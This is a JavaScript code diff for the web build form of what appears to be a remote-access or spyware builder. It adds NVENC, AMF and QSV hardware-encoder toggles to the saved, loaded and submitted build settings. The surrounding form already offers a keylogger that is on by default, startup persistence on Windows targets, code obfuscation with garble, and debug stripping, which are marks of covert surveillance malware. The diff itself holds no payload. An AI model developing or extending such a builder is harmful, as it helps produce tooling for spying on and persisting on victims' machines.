@@ -188,6 +188,9 @@ function setBuildField(field, value) {
     garbleLiterals: 'input[name="garble-literals"]',
     garbleTiny: 'input[name="garble-tiny"]',
     disableCgo: 'input[name="disable-cgo"]',
+    enableNvenc: 'input[name="enable-nvenc"]',
+    enableAmf: 'input[name="enable-amf"]',
+    enableQsv: 'input[name="enable-qsv"]',
     stripDebug: 'input[name="strip-debug"]',
     noPrinting: 'input[name="no-printing"]',
     enableWebrtc: 'input[name="enable-webrtc"]',
@@ -455,6 +458,9 @@ function collectFormSettings() {
     disableMutex: document.querySelector('input[name="disable-mutex"]')?.checked ?? false,
     stripDebug: document.querySelector('input[name="strip-debug"]')?.checked ?? true,
     disableCgo: document.querySelector('input[name="disable-cgo"]')?.checked ?? false,
+    enableNvenc: document.querySelector('input[name="enable-nvenc"]')?.checked ?? true,
+    enableAmf: document.querySelector('input[name="enable-amf"]')?.checked ?? true,
+    enableQsv: document.querySelector('input[name="enable-qsv"]')?.checked ?? true,
     noPrinting: document.querySelector('input[name="no-printing"]')?.checked ?? false,
     enableKeylogger: document.querySelector('input[name="enable-keylogger"]')?.checked ?? true,
     enableWebrtc: document.querySelector('input[name="enable-webrtc"]')?.checked ?? false,
@@ -522,6 +528,9 @@ function applyFormSettings(settings) {
   if (settings.disableMutex !== undefined) setCb('input[name="disable-mutex"]', settings.disableMutex);
   if (settings.stripDebug !== undefined) setCb('input[name="strip-debug"]', settings.stripDebug);
   if (settings.disableCgo !== undefined) setCb('input[name="disable-cgo"]', settings.disableCgo);
+  if (settings.enableNvenc !== undefined) setCb('input[name="enable-nvenc"]', settings.enableNvenc);
+  if (settings.enableAmf !== undefined) setCb('input[name="enable-amf"]', settings.enableAmf);
+  if (settings.enableQsv !== undefined) setCb('input[name="enable-qsv"]', settings.enableQsv);
   if (settings.noPrinting !== undefined) setCb('input[name="no-printing"]', settings.noPrinting);
   if (settings.enableKeylogger !== undefined) setCb('input[name="enable-keylogger"]', settings.enableKeylogger);
   if (settings.enableWebrtc !== undefined) setCb('input[name="enable-webrtc"]', settings.enableWebrtc);
@@ -1692,6 +1701,9 @@ form?.addEventListener("submit", async (e) => {
   const disableMutex = form.querySelector('input[name="disable-mutex"]')?.checked || false;
   const stripDebug = form.querySelector('input[name="strip-debug"]').checked;
   const disableCgo = form.querySelector('input[name="disable-cgo"]').checked;
+  const enableNvenc = form.querySelector('input[name="enable-nvenc"]')?.checked ?? true;
+  const enableAmf = form.querySelector('input[name="enable-amf"]')?.checked ?? true;
+  const enableQsv = form.querySelector('input[name="enable-qsv"]')?.checked ?? true;
   const obfuscate = form.querySelector('input[name="obfuscate"]').checked;
   const enablePersistence = form.querySelector(
     'input[name="enable-persistence"]',
@@ -1739,6 +1751,9 @@ form?.addEventListener("submit", async (e) => {
     disableMutex,
     stripDebug,
     disableCgo,
+    enableNvenc,
+    enableAmf,
+    enableQsv,
     obfuscate,
     enablePersistence,
     persistenceMethods: enablePersistence && hasWindowsTarget ? (persistenceMethods && persistenceMethods.length > 0 ? persistenceMethods : ['startup']) : undefined,
